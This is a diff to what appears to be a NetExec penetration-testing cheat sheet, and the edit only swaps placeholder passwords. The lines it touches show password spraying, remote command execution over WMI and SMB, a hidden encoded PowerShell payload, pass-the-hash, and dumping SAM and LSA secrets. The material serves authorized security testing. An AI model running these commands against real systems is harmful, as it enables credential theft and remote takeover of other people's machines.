@@ -43,12 +43,12 @@ nxc smb $IP -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
 
 ```bash
 # Check credentials (default to smb)
-nxc smb $IP -u username -p 'Password123!'
+nxc smb $IP -u username -p 'password'
 
 # Execute commands (default to wmi, then smb)
-nxc wmi $IP -u username -p 'Password123!' -x whoami
-nxc smb $IP -u username -p 'Password123!' -x whoami
-nxc smb $IP -u username -p 'Password123!' -x 'powershell -nop -w hidden -noni -ep bypass -e JABjAGwAaQBlAG4AdAAgAD0AIABO...'
+nxc wmi $IP -u username -p 'password' -x whoami
+nxc smb $IP -u username -p 'password' -x whoami
+nxc smb $IP -u username -p 'password' -x 'powershell -nop -w hidden -noni -ep bypass -e JABjAGwAaQBlAG4AdAAgAD0AIABO...'
 ```
 
 NOTE: Add `--local-auth` flag to check credentials against the local user database, as opposed to the domain
@@ -77,8 +77,8 @@ nxc smb 192.168.1.0/24 -u Administrator -H 'aad3b435b51404eeaad3b435b51404ee:13b
 
 ```bash
 # Dump SAM (requires Domain Admin or Local Admin Privileges with --local-auth)
-nxc smb $IP -u Administrator -p 'Password123!' --sam
+nxc smb $IP -u Administrator -p 'password' --sam
 
 # Dump LSA secrets (requires Domain Admin or Local Admin Privileges with --local-auth)
-nxc smb $IP -u Administrator -p 'Password123!' --lsa
+nxc smb $IP -u Administrator -p 'password' --lsa
 ```
